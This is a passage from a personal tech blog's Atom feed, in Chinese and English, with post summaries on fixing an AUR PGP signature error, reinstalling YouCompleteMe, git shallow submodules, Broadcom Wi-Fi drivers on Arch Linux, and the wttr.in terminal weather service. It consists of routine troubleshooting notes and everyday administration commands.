感謝。  &lt;/p&gt;</summary><category term="4G"></category><category term="LTE"></category><category term="2018 iT 邦幫忙鐵人賽"></category><category term="Mobile Network"></category></entry><entry><title>ERROR: One or more PGP signatures could not be verified</title><link href="https://blog.m157q.tw/posts/2017/11/27/one-or-more-pgp-signatures-could-not-be-verified/" rel="alternate"></link><published>2017-11-27T14:56:38+08:00</published><updated>2017-11-27T14:56:38+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-11-27:posts/2017/11/27/one-or-more-pgp-signatures-could-not-be-verified/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;gpg --keyserver keys.gnupg.net --recv-keys ${PGP_PUBLIC_KEY}&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;Encountered this error while installing &lt;code&gt;firefox-nightly&lt;/code&gt; from AUR  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;==&amp;gt; Verifying source file signatures with gpg...  
    20171127-firefox-59.0a1.en-US.linux-x86_64.tar.bz2 ... FAILED (unknown public key BBBEBDBB24C6F355)  
==&amp;gt; ERROR: One or more PGP signatures could not be verified!  
==&amp;gt; ERROR: Makepkg was unable to build firefox-nightly.  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Solution&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;gpg --keyserver keys.gnupg.net --recv-keys BBBEBDBB24C6F355&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bbs.archlinux.org/viewtopic.php?id=191954"&gt;One or more PGP signatures could not be verified! / AUR Issues, Discussion &amp;amp; PKGBUILD Requests / Arch Linux Forums&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://allanmcrae.com/2015/01/two-pgp-keyrings-for-package-management-in-arch-linux/"&gt;Two PGP Keyrings for Package Management in Arch Linux | Allan McRae&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Arch Linux"></category><category term="makepkg"></category><category term="yaourt"></category><category term="AUR"></category><category term="PGP"></category></entry><entry><title>The ycmd server SHUT DOWN (restart with ':YcmRestartServer')</title><link href="https://blog.m157q.tw/posts/2017/11/27/youcompleteme-ycmd-server-shut-down-restart-with-ycmrestartserver/" rel="alternate"></link><published>2017-11-27T12:47:33+08:00</published><updated>2017-11-27T12:47:33+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-11-27:posts/2017/11/27/youcompleteme-ycmd-server-shut-down-restart-with-ycmrestartserver/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Valloric/YouCompleteMe/issues/1707#issuecomment-222056711"&gt;https://github.com/Valloric/YouCompleteMe/issues/1707#issuecomment-222056711&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~/.vim/bundle/YouCompleteMe  
./install.py --clang-completer  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;YouCompleteMe doesn't work anymore in my Vim.  &lt;/li&gt;
&lt;li&gt;Got &lt;code&gt;The ycmd server SHUT DOWN (restart with ':YcmRestartServer')&lt;/code&gt; in status bar everytime Vim starts.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;:YcmRestartServer&lt;/code&gt; always failed.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;:YcmDebugInfo&lt;/code&gt; shows the system path of YouCompleteMe stderr log.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ less /tmp/ycmd_52159_stderr_m7n92px1.log&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;It shows &lt;code&gt;ModuleNotFoundError: No module named 'ycm_core'&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Solution&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~/.vim/bundle/YouCompleteMe  
./install.py --clang-completer  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Reinstall YouCompleteMe with Clang completer works.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Valloric/YouCompleteMe/issues/914"&gt;https://github.com/Valloric/YouCompleteMe/issues/914&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Valloric/YouCompleteMe/issues/1707#issuecomment-222056711"&gt;https://github.com/Valloric/YouCompleteMe/issues/1707#issuecomment-222056711&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Vim"></category><category term="YouCompleteMe"></category></entry><entry><title>如何及為什麼要使用 `git clone --shallow-submodules`</title><link href="https://blog.m157q.tw/posts/2017/11/03/what-does-git-clone-shallow-submodules-do-and-how-to-use-it/" rel="alternate"></link><published>2017-11-03T16:24:16+08:00</published><updated>2017-11-03T16:24:16+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-11-03:posts/2017/11/03/what-does-git-clone-shallow-submodules-do-and-how-to-use-it/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git clone --shallow-submodules&lt;/code&gt; must be used with &lt;code&gt;--recurse-submodules&lt;/code&gt;.&lt;br /&gt;
That is,  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;git clone --recurse-submodules --shallow-submodules &amp;lt;repository&amp;gt;&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;(git version 2.15.0)  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;How to use &lt;code&gt;--shallow-submodules&lt;/code&gt; for &lt;code&gt;git clone&lt;/code&gt;?&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;man git-clone&lt;/code&gt; 其實沒有寫得很清楚  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://git-scm.com/docs/git-clone#git-clone---no-shallow-submodules"&gt;Git - git-clone Documentation&lt;/a&gt;:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;--[no-]shallow-submodules&lt;br /&gt;
           All submodules which are cloned will be shallow with a depth of 1.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;看完以後以為只要 &lt;code&gt;git clone --shallow-submodules&lt;/code&gt;，&lt;br /&gt;
就會自動幫你 &lt;code&gt;git submodule update --init --depth 1&lt;/code&gt;，&lt;br /&gt;
但並沒有。  &lt;/p&gt;
&lt;p&gt;經過 &lt;a href="https://twitter.com/WanCW/status/924993679156056064"&gt;WanCW 的實際測試&lt;/a&gt;後才知道，&lt;br /&gt;
&lt;code&gt;--shallow-submodules&lt;/code&gt; 一定要搭配 &lt;code&gt;--recurse-submodules&lt;/code&gt; 才有作用。  &lt;/p&gt;
&lt;p&gt;如果只使用 &lt;code&gt;git clone --shallow-submodules&lt;/code&gt;，&lt;br /&gt;
會發現 submodule 的資料夾都還是空的，&lt;br /&gt;
一樣得 &lt;code&gt;git submodulte update --init --depth 1&lt;/code&gt; 才有用。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Why use &lt;code&gt;--shallow-submodules&lt;/code&gt; for &lt;code&gt;git clone&lt;/code&gt;?&lt;/h2&gt;
&lt;p&gt;減少整個 git clone 的傳輸量以及佔用硬碟的空間，&lt;br /&gt;
submodules 都只會有最新一筆的 commit 及其 data 而已。&lt;br /&gt;
（進入 submodule 後會看到 git log 只會有一筆資料）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;When to use &lt;code&gt;--shallow-submodules&lt;/code&gt; for &lt;code&gt;git clone&lt;/code&gt;?&lt;/h2&gt;
&lt;p&gt;個人目前想到的適用情境：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;local 開發時不需要一併開發 submodule 的情況下  &lt;ul&gt;
&lt;li&gt;既然 submodule 只有需要被使用，不需要開發的話，只要抓最新的部份拿來用就好，可以減少 clone 的時間。  &lt;/li&gt;
&lt;li&gt;submodule 愈肥大的話，clone 的時間應該省愈多。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deploy 的時候  &lt;ul&gt;
&lt;li&gt;因為不需要修改 code 了，讓 CI clone source code 的時候可以減少傳輸量，加速 deploy 時的速度。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其他有想到再補上。  &lt;/p&gt;</summary><category term="Git"></category></entry><entry><title>用 broadcom-wl-dkms 讓 BCM4360 [14e4:43a0] (rev 03) 能順利在 Arch Linux 中使用</title><link href="https://blog.m157q.tw/posts/2017/10/31/make-bcm4360-14e4-43a0-rev-03-work-on-arch-linux-with-broadcom-wl-dkms/" rel="alternate"></link><published>2017-10-31T17:10:43+08:00</published><updated>2017-10-31T17:10:43+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-10-31:posts/2017/10/31/make-bcm4360-14e4-43a0-rev-03-work-on-arch-linux-with-broadcom-wl-dkms/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sudo pacman -S broadcom-wl-dkms&lt;/code&gt; should be good.  &lt;/p&gt;
&lt;p&gt;If you are using &lt;code&gt;wicd&lt;/code&gt; like me,&lt;br /&gt;
remember to &lt;a href="https://wiki.archlinux.org/index.php/wicd#Initial_setup"&gt;close other network management daemon&lt;/a&gt; like:  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;systemctl stop dhcpcd&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;systemctl disable dhcpcd&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;systemctl stop NetworkManager&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;systemctl disable NetworkManager&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;正文&lt;/h2&gt;
&lt;p&gt;之前好一陣子都是一直用 &lt;code&gt;broadcom-wl-dkms-248-6.30.223.248-1-x86_64&lt;/code&gt; 撐著，&lt;br /&gt;
簡單來說就是之前從 AUR 上 download 這版的 &lt;code&gt;broadcom-wl-dkms&lt;/code&gt; 下來後，&lt;br /&gt;
之後每次更新用新版的都有問題，&lt;br /&gt;
就得一直 down grade 下來&lt;br /&gt;
所以我就一直留著舊版的以備不時之需，&lt;br /&gt;
救了我好幾次。  &lt;/p&gt;
&lt;p&gt;而且因為 dkms 每次在 kernel upgrade 之後，&lt;br /&gt;
都會幫你重新 build 一次，&lt;br /&gt;
基本上不用理他，&lt;br /&gt;
所以我後來也把原本有從 AUR 上裝的 &lt;code&gt;broadcom-wl-dkms&lt;/code&gt; 刪掉了，&lt;br /&gt;
之後自動更新就不會需要一直 down grade。  &lt;/p&gt;
&lt;p&gt;直到昨天升上 &lt;code&gt;Linux 4.13.9-1-ARCH&lt;/code&gt;，&lt;br /&gt;
dkms 無法成功 build &lt;code&gt;broadcom-wl-dkms-248-6.30.223.248-1-x86_64&lt;/code&gt;，&lt;br /&gt;
我在升級 kernel 的時候又沒去注意 kernel upgrade 的訊息，&lt;br /&gt;
於是我的無線網卡在重開機之後就消失在 &lt;code&gt;ip&lt;/code&gt;, &lt;code&gt;iwconfig&lt;/code&gt; 的 output 了。  &lt;/p&gt;
&lt;p&gt;以前就遇過好幾次這狀況了，&lt;br /&gt;
所以並沒有特別的驚慌。&lt;br /&gt;
想說來試裝看看新版的 &lt;code&gt;broadcom-wl-dkms&lt;/code&gt;，&lt;br /&gt;
才發現&lt;a href="https://www.archlinux.org/packages/community/x86_64/broadcom-wl-dkms/"&gt;已經從 AUR 被移到 community repository 了&lt;/a&gt;，&lt;br /&gt;
用 &lt;code&gt;sudo pacman -S broadcom-wl-dkms&lt;/code&gt; 安裝後，&lt;br /&gt;
看了一下訊息，&lt;br /&gt;
看起來有成功 build 並安裝。  &lt;/p&gt;
&lt;p&gt;重開機之後，&lt;br /&gt;
無線網卡出現了，&lt;br /&gt;
也搜尋得到 SSID，&lt;br /&gt;
但就是連不上。&lt;br /&gt;
卡了很久，&lt;br /&gt;
想說回來看看以前自己寫的&lt;a href="/posts/2015/09/10/install-arch-linux-on-macbook-air-mid-2013/"&gt;這篇文章&lt;/a&gt;會不會有什麼端倪，&lt;br /&gt;
結果就看到了&lt;br /&gt;
「記得 disable dhcpcd，錯誤訊息也看不出啥端倪，就是在這卡了很久。」&lt;br /&gt;
頓時覺得似曾相似。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;systemctl status dhcpcd&lt;/code&gt; 是 inactive 的，&lt;br /&gt;
又想到了 &lt;code&gt;NetworkManager&lt;/code&gt; 也會影響到，&lt;br /&gt;
&lt;code&gt;systemctl status NetworkManager&lt;/code&gt; 是 running...&lt;br /&gt;
靠，怎麼又被誰打開了，&lt;br /&gt;
&lt;code&gt;systemctl stop NetworkManager&lt;/code&gt; 之後果然就正常了。&lt;br /&gt;
因為之前沒有紀錄錯誤訊息導致我這次找超久，&lt;br /&gt;
所以這次就來紀錄一下這些在 &lt;code&gt;dmesg&lt;/code&gt; 會看到的錯誤訊息吧。&lt;br /&gt;
（同樣的錯誤訊息也有新增在之前的文章了。）  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6677.574915] ERROR @wl_notify_scan_status :  
[ 6677.574919] wlp3s0 Scan_results error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6560.346608] ERROR @wl_cfg80211_scan :  
[ 6560.346611] WLC_SCAN error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6467.860408] ERROR @wl_notify_scan_status :  
[ 6467.860413] wlp3s0 Scan_results error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;也因為這次的遭遇而誕生了這篇新文章，&lt;br /&gt;
畢竟網路上跟 Arch Linux 相關的資源實在有點少，&lt;br /&gt;
拿這些錯誤訊息去 Google 看到跟 Arch Linux 相關的，&lt;br /&gt;
大多是 DELL 筆電 (XPS 13, Vostro 3560) 的問題，&lt;br /&gt;
&lt;a href="https://bbs.archlinux.org/viewtopic.php?pid=1216302#p1216302"&gt;解法是要用 Fn+PrtScrn 把 Wireless 開啟&lt;/a&gt;。&lt;br /&gt;
第二多的就是跟 Ubuntu 相關的，&lt;br /&gt;
&lt;a href="https://askubuntu.com/a/60395"&gt;有篇超級詳細的回答已經紀錄在這了&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;小確幸&lt;/h2&gt;
&lt;p&gt;不得不說一下，&lt;br /&gt;
這種幾年前自己寫的筆記，&lt;br /&gt;
救了現在的自己的感覺，&lt;br /&gt;
真的是會讓人有  &lt;/p&gt;
&lt;p&gt;「啊，還好當初有花時間紀錄下來。」  &lt;/p&gt;
&lt;p&gt;的那種欣慰又安全的感覺啊。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;題外話: DKMS&lt;/h2&gt;
&lt;p&gt;也是這次查解法的過程看到&lt;a href="https://bbs.archlinux.org/viewtopic.php?pid=1370568#p1370568"&gt;這篇文章&lt;/a&gt;才知道，&lt;br /&gt;
其實 Arch Linux 現在每次 kernel upgrade 幫你做的事大致上就是  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dkms remove &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;KERNEL_MODULE_NAME&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt; -v &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;KERNEL_MODULE_VERSION&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt; -k &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;CURRENT_KERNEL_VERSION&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;  
dkms install &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;KERNEL_MODULE_NAME&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt; -v &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;KERNEL_MODULE_VERSION&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt; -k &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;NEW_KERNEL_VERSION&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;實際大概長的像這樣  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dkms remove broadcom-wl -v 6.30.223.271-15 -k 4.13.8-1-ARCH  
dkms install broadcom-wl -v 6.30.223.271-15 -k 4.13.9-1-ARCH  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;至於 &lt;code&gt;dkms install&lt;/code&gt; == &lt;code&gt;dkms build&lt;/code&gt; + &lt;code&gt;dkms add&lt;/code&gt;&lt;br /&gt;
這個可以 &lt;code&gt;man dkms&lt;/code&gt; 就可以看到了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;install [module/module-version] [-k kernel/arch] [/path/to/driver.rpm]  

    Installs  a  built module/version combo onto the kernel it was built for.  
    If the kernel option is not specified it assumes the currently running kernel.  
    If the module has not been built, dkms will try to build it.  
    If the module has  not been added, dkms will try to add it.  
    In both cases, the install command can then take the same arguments as the build or add commands.  
    If you pass a .rpm file, dkms will try to install that file with rpm -Uvh ,  
    and it will perform an autoinstall action to mesure that everything is built for your kernel if the RPM installed sucess‐  
    fully.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這只是個人粗淺的理解，&lt;br /&gt;
如果理解有誤的話還請不吝指教。  &lt;/p&gt;</summary><category term="Arch Linux"></category><category term="Broadcom"></category><category term="Wireless"></category><category term="MacBook Air"></category></entry><entry><title>wttr.in - 一個讓你用網頁或終端機看天氣或月亮圓缺的有趣網站</title><link href="https://blog.m157q.tw/posts/2017/10/20/wttr-in/" rel="alternate"></link><published>2017-10-20T23:35:15+08:00</published><updated>2017-10-20T23:35:15+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-10-20:posts/2017/10/20/wttr-in/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;最近不知道為啥身邊一堆人在傳 &lt;a href="http://wttr.in"&gt;wttr.in&lt;/a&gt;，&lt;br /&gt;
才發現好像有很多人不知道。&lt;br /&gt;
自己是有陣子之前就開始用了，&lt;br /&gt;
當時有花一點時間亂看過&lt;a href="https://github.com/chubin/wttr.in"&gt;這個專案的程式碼&lt;/a&gt;，&lt;br /&gt;
依稀記得 wttr.in 有一些比較少人知道的小功能，&lt;br /&gt;
回朋友的某個跟 wttr.in 相關的 Facebook 動態時又去找了一下。&lt;br /&gt;
查著查著突然心血來潮，&lt;br /&gt;
乾脆寫這篇廢文筆記一下。  &lt;/p&gt;
&lt;p&gt;反正邊緣人的週五晚上沒事做。（嗚嗚  &lt;/p&gt;
&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;curl wttr.in&lt;/code&gt; &amp;amp;&amp;amp; &lt;code&gt;curl wttr.in/:help&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wttr.in"&gt;http://wttr.in&lt;/a&gt; &amp;amp;&amp;amp; &lt;a href="http://wttr.in/:help"&gt;http://wttr.in/:help&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;專案的原始碼在這：&lt;a href="https://github.com/chubin/wttr.in"&gt;https://github.com/chubin/wttr.in&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;介紹&lt;/h2&gt;
&lt;p&gt;最簡單的用法就是 &lt;code&gt;curl wttr.in&lt;/code&gt;&lt;br /&gt;
或用網頁瀏覽器直接連到 &lt;a href="http://wttr.in"&gt;http://wttr.in&lt;/a&gt;&lt;br /&gt;
就會得到像這樣精美的 ASCII Art 天氣預報圖。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="wttr-web" src="/files/wttr-in/wttr-web.jpg" /&gt;&lt;br /&gt;
&lt;img alt="wttr-cli" src="/files/wttr-in/wttr-cli.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;但基本上要用等寬字型才會比較正確的顯示，&lt;br /&gt;
否則排版會亂掉。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;比較少人知道的功能&lt;/h2&gt;
&lt;h3&gt;支援 UTF-8&lt;/h3&gt;
&lt;p&gt;所以其實可以直接用中文  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl wttr.in/台北&lt;/code&gt; 或 &lt;a href="http://wttr.in/台北"&gt;http://wttr.in/台北&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;可以用不同的形式指定想查的城市天氣&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Supported location types:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/paris                  # city name  
/~Eiffel+tower          # any location  
/Москва                 # Unicode name of any location in any language  
/muc                    # airport code (3 letters)  
/@stackoverflow.com     # domain name  
/94107                  # area codes  
/-78.46,106.79          # GPS coordinates
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;城市名稱（含 UTF-8，不一定要用英文）  &lt;/li&gt;
&lt;li&gt;~地標  &lt;/li&gt;
&lt;li&gt;機場代號  &lt;/li&gt;
&lt;li&gt;@域名 （透過 DNS 去搜尋該域名所註冊的城市）  &lt;/li&gt;
&lt;li&gt;IP 位址  &lt;/li&gt;
&lt;li&gt;美國郵遞區號  &lt;/li&gt;
&lt;li&gt;經緯度  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;支援不同語言顯示&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Localization:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl fr.wttr.in/Paris  
$ curl wttr.in/paris?lang&lt;span class="o"&gt;=&lt;/span&gt;fr  
$ curl -H &lt;span class="s2"&gt;&amp;quot;Accept-Language: fr&amp;quot;&lt;/span&gt; wttr.in/paris
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;p&gt;可以用中文顯示，&lt;br /&gt;
用法是這樣  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wttr.in/taipei"&gt;http://zh.wttr.in/taipei&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wttr.in/taipei?lang=zh"&gt;http://wttr.in/taipei?lang=zh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl -H "Accept-Language: zh" wttr.in/taipei&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不過這部份還在持續開發中，&lt;br /&gt;
目前是神奇的簡繁混雜的狀況。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="wttr-cli-zh" src="/files/wttr-in/wttr-cli-zh.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;中文翻譯的 Issue &lt;a href="https://github.com/chubin/wttr.in/issues/83"&gt;在此&lt;/a&gt;&lt;br /&gt;
追了一下，&lt;br /&gt;
應該是中間的討論產生了一些誤解，&lt;br /&gt;
原本有人給簡中翻譯，&lt;br /&gt;
結果後來有人以為是繁中，&lt;br /&gt;
所以就變這樣哩，&lt;br /&gt;
是個可以發 PR 的機會。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;可以直接產生 PNG 圖片&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;PNG options:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/paris.png              # generate a PNG file  
?p                      # add frame arond the output  
?t                      # transparency 150  
transparency=...        # transparency from 0 to 255 (255 = not transparent)
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="http://wttr.in/taipei.png"&gt;http://wttr.in/taipei.png&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;支援加邊框和調整透明度的參數&lt;br /&gt;
PS：圖片這邊也支援使用下面會提到的參數  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;可以接受參數&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Units:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;?m     # metric (SI) (used by default everywhere except US)  
?u     # USCS (used by default in US)  
?M     # show wind speed in m/s
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;View options:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;?0     # only current weather  
?1     # current weather + 1 day  
?2     # current weather + 2 days  
?n     # narrow version (only day and night)  
?q     # quiet version (no &amp;quot;Weather report&amp;quot; text)  
?Q     # superquiet version (no &amp;quot;Weather report&amp;quot;, no city name)  
?T     # switch terminal sequences off (no colors)
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;p&gt;其實&lt;a href="https://github.com/chubin/wttr.in/blob/ac939032fd593b14584ce5c38a86a68026a0190a/share/help.txt"&gt;這程式有吃不少參數&lt;/a&gt;，&lt;br /&gt;
也可以用 &lt;code&gt;curl wttr.in/:help&lt;/code&gt; 直接查看。&lt;br /&gt;
傳參數給它的方法是接在問號後面，&lt;br /&gt;
像 &lt;code&gt;curl "wttr.in/taipei?0"&lt;/code&gt;&lt;br /&gt;
大家可以自己試試看，&lt;br /&gt;
這邊就不一一介紹了。  &lt;/p&gt;
&lt;p&gt;我自己慣用的參數就以下這兩個：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;: 只顯示現在天氣，不顯示未來幾天的預報  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;q&lt;/code&gt;: 讓輸出不會顯示 "Weather Report" 的字串  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;加上這兩個參數以後輸出就會變得非常簡潔乾淨，&lt;br /&gt;
很適合拿來放在 motd&lt;br /&gt;
&lt;code&gt;curl "wttr.in/taipei?0q"&lt;/code&gt;&lt;br /&gt;
&lt;img alt="wttr-cli-0q" src="/files/wttr-in/wttr-cli-0q.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;可以接多個參數&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Options can be combined:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/Paris?0pq  
/Paris?0pq&amp;amp;lang=fr  
/Paris_0pq.png          # in PNG the file mode are specified after _  
/Rome_0pq_lang=it.png   # long options are separated with underscore
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;p&gt;多個參數就直接接上去就好了，&lt;br /&gt;
&lt;code&gt;&amp;amp;&lt;/code&gt; 可加可不加，&lt;br /&gt;
除非遇到像有等號的 &lt;code&gt;lang=zh&lt;/code&gt; 才得加 &lt;code&gt;&amp;amp;&lt;/code&gt;&lt;br /&gt;
也就是說  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/taipei?0q&lt;/code&gt; 等同於 &lt;code&gt;/taipei?0&amp;amp;q&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;taipei?0&amp;amp;q&amp;amp;lang=zh&lt;/code&gt; 等同於 &lt;code&gt;/taipei?0q&amp;amp;lang=zh&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果是要 png 圖片的話要變這樣  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/taipei_0g.png&lt;/code&gt; 等同於 &lt;code&gt;/taipei_0&amp;amp;q.png&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/taipei_0&amp;amp;q&amp;amp;lang=zh.png&lt;/code&gt; 等同於 &lt;code&gt;/taipei_0q&amp;amp;lang=zh.png&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;可以包成一個簡單的 shell function&lt;/h3&gt;
&lt;p&gt;官方有&lt;a href="https://github.com/chubin/wttr.in/blob/ac939032fd593b14584ce5c38a86a68026a0190a/share/bash-function.txt"&gt;推薦怎麼加一個簡單使用 wttr.in 的 bash function&lt;/a&gt;&lt;br /&gt;
也可以用 &lt;code&gt;curl "wttr.in/:bash.function"&lt;/code&gt; 來察看  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;wttr()  
{  
    # change Paris to your default location  
